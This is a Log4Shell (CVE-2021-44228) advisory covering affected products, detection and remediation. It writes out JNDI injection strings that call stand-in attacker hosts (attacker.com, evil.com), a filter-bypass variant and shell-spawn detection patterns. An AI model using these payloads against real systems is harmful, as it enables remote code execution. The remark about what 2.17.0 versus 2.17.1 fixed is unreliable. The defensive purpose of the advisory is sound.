# CVE-2021-44228 — Log4Shell

**CVSS:** 10.0 | **Severity:** Critical | **Disclosed:** 2021-12-09

## Summary
Log4Shell is a remote code execution vulnerability in Apache Log4j 2, versions 2.0-beta9 through 2.14.1. The flaw exists in the JNDI lookup feature, which does not adequately restrict the protocols and destinations that can be resolved. An unauthenticated attacker can exploit this by sending a crafted log message containing a JNDI reference (e.g., `${jndi:ldap://attacker.com/payload}`), causing the vulnerable server to fetch and execute arbitrary code from an attacker-controlled server.

## Affected Products
- Apache Log4j 2.0-beta9 through 2.14.1
- Any Java application or framework embedding Log4j 2 (e.g., Apache Struts, Solr, Druid, Flink, Kafka)
- VMware vCenter, Horizon, NSX
- Cisco products using Java-based logging
- Elastic Logstash (pre-6.8.21 / pre-7.16.1)

## Attack Vector
The attacker injects a JNDI lookup string such as `${jndi:ldap://evil.com/a}` into any input field that gets logged — HTTP headers (User-Agent, X-Forwarded-For), form fields, API parameters, or chat messages. When Log4j processes the log entry, it resolves the JNDI reference, connects to the attacker's LDAP or RMI server, downloads a malicious Java class, and executes it in the context of the application. Obfuscation variants such as `${${lower:j}ndi:ldap://...}` bypass naive string filters.

## Detection
- Search logs for patterns: `${jndi:`, `${lower:`, `${upper:`, `${env:` in HTTP request fields
- Network signatures: outbound LDAP (port 389/636) or RMI (port 1099) connections from application servers to unexpected destinations
- EDR indicators: `java.exe` or application process spawning `cmd.exe`, `powershell.exe`, `bash`, or `curl`/`wget`
- Use scanning tools such as log4j-scan or Huntress Log4Shell tester to identify vulnerable instances

## Remediation
- **Patch:** Upgrade to Log4j 2.17.1 or later (2.17.0 fixed the main RCE; 2.17.1 addressed a remaining DoS vector)
- **Workaround:** Set the JVM flag `-Dlog4j2.formatMsgNoLookups=true` (Log4j 2.10+), or remove the JndiLookup class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`

## MITRE ATT&CK
- T1190 — Exploit Public-Facing Application
- T1059.007 — Command and Scripting Interpreter: JavaScript/JScript (post-exploitation)
- T1105 — Ingress Tool Transfer
- T1071.001 — Application Layer Protocol: Web Protocols

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://logging.apache.org/log4j/2.x/security.html
